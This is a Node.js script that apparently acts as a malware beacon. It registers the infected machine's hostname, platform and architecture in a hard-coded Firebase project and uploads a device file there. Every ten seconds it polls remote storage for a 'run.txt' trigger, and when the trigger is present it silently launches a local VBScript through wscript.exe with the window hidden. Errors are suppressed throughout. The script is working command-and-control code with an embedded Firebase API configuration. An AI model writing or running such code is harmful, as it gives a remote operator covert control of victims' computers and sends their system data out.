// ===============================
// REQUIRED MODULES
// ===============================
const os = require("os");
const { execFile } = require("child_process");
const path = require("path");
const { exec } = require("child_process");

// Firebase
const { initializeApp } = require("firebase/app");
const { getDatabase, ref, get, set } = require("firebase/database");
const { getStorage, ref: sRef, listAll, uploadBytes } = require("firebase/storage");

// ===============================
// FIREBASE CONFIG
// ===============================
const firebaseConfig = {
  apiKey: "AIzaSyBazQ7sknQ8zn53PDQTLPQyXW4BiLXgaoE",
  authDomain: "datasystem-4ab3d.firebaseapp.com",
  databaseURL: "https://datasystem-4ab3d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "datasystem-4ab3d",
  storageBucket: "datasystem-4ab3d.appspot.com",
  messagingSenderId: "761286626969",
  appId: "1:761286626969:web:85fb7dace68a93340eb208"
};

// ===============================
// INIT FIREBASE
// ===============================
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const storage = getStorage(app);

// ===============================
// DEVICE INFO
// ===============================
const deviceName = os.hostname();
const platform = os.platform();
const arch = os.arch();
const createdAt = Date.now();

// ===============================
// IN-MEMORY FILE CONTENT
// ===============================
const fileContent = `
Device Name: ${deviceName}
Platform: ${platform}
Architecture: ${arch}
Created: ${new Date(createdAt).toISOString()}
`;

const fileBuffer = Buffer.from(fileContent, "utf-8");

// ===============================
// ENSURE DEVICE ENTRY IN DATABASE
// ===============================
async function ensureDeviceInDB() {
  try {
    const deviceRef = ref(db, `devices/${deviceName}`);
    const snapshot = await get(deviceRef);

    if (!snapshot.exists()) {
      await set(deviceRef, {
        device: deviceName,
        platform,
        arch,
        createdAt
      });
    }
  } catch (err) {
    // ignore DB errors
  }
}

// ===============================
// ENSURE FILE IN STORAGE
// ===============================
async function ensureFileInStorage() {
  try {
    const storageRef = sRef(storage, `devices/${deviceName}/file.txt`);
    const parentRef = sRef(storage, `devices/${deviceName}`);
    const files = await listAll(parentRef);
    const exists = files.items.some(item => item.name === "file.txt");

    if (!exists) {
      await uploadBytes(storageRef, fileBuffer);
    }
  } catch (err) {
    // ignore storage errors
  }
}

// ===============================
// CHECK FOR run.txt IN STORAGE
// ===============================
async function checkRunFile() {
  try {
    const parentRef = sRef(storage, `devices/${deviceName}`);
    const files = await listAll(parentRef);

    const hasRunFile = files.items.some(item => item.name === "run.txt");
    if (!hasRunFile) return;

    console.log("run.txt detected, running delay.vbs");

const vbsPath = path.join(__dirname, "delay.vbs");

execFile(
  "wscript.exe",
  [vbsPath],
  { windowsHide: true },
  (error) => {
    if (error) return;
  }
);
  } catch (err) {
    // ignore errors
  }
}


// ===============================
// MAIN LOOP
// ===============================
async function main() {
  await ensureDeviceInDB();
  await ensureFileInStorage();
  await checkRunFile();

  // repeat every 10 seconds
  setInterval(async () => {
    await ensureDeviceInDB();
    await ensureFileInStorage();
    await checkRunFile();
  }, 10000);
}

// run main
main();


